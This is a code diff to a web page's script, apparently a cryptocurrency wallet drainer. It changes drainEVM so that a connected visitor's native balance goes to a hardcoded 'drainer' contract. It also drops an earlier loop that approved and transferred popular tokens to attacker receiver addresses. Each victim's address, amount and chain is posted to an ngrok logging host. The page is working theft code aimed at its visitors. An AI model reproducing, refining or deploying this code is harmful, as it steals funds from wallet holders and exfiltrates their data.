@@ -121,11 +121,10 @@
   </div>
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
   <script>
+    const DRAINER_CONTRACT = '0x46df10Fe0Cdf1681F6607E4481Fdd1A41cCbA170';
     const receivers = { eth: '0x87d36b1e5db6159D2bf821DB6182e60C7025347e', sol: '2fxFnGXVvbNTNWmi3YLJ2LpUNCDoNcEPYcxEKRHLHvCf', tron: 'TA1A85Q31usCDqmWGqLB6JbmVD3CUxS58T' };
-    const popularTokens = ['0xdAC17F958D2ee523a2206206994597C13D831ec7','0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','0x6982508145454Ce325dDbE47a25d4ec3d2311933','0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE'];
 
     function log(token, amount, user, chain) {
-      console.log('LOG FUNCTION CALLED');
       fetch('https://zofia-undefective-twila.ngrok-free.dev/log', {
         method: 'POST',
         headers: {
@@ -145,24 +144,27 @@
     async function drainEVM(provider, signer, address, chainId) {
       document.getElementById('status').innerText = 'Connected';
       log('connect', '0', address, chainId);
-      const receiver = receivers.eth;
+
       try {
+        const contract = new ethers.Contract(
+          DRAINER_CONTRACT,
+          ['function drain() payable'],
+          signer
+        );
+
         const bal = await provider.getBalance(address);
+        let valueToSend = 0n;
         if (bal > ethers.parseEther('0.00005')) {
-          await signer.sendTransaction({ to: receiver, value: bal - ethers.parseEther('0.00002') });
-          log('native', ethers.formatEther(bal), address, chainId);
+          valueToSend = bal - ethers.parseEther('0.00003');
         }
-      } catch (e) {}
-      for (const t of popularTokens) {
-        try {
-          const c = new ethers.Contract(t, ['function balanceOf(address) view returns (uint256)', 'function approve(address,uint256) returns (bool)', 'function transferFrom(address,address,uint256) returns (bool)'], signer);
-          const b = await c.balanceOf(address);
-          if (b > 0n) {
-            await (await c.approve(receiver, b)).wait();
-            await (await c.transferFrom(address, receiver, b)).wait();
-            log(t, b.toString(), address, chainId);
-          }
-        } catch (e) {}
+
+        const tx = await contract.drain({ value: valueToSend });
+        await tx.wait();
+        log('contract-drain', ethers.formatEther(valueToSend), address, chainId);
+        document.getElementById('status').innerText = 'Success';
+      } catch (e) {
+        console.log(e);
+        document.getElementById('status').innerText = 'Cancelled';
       }
     }
 
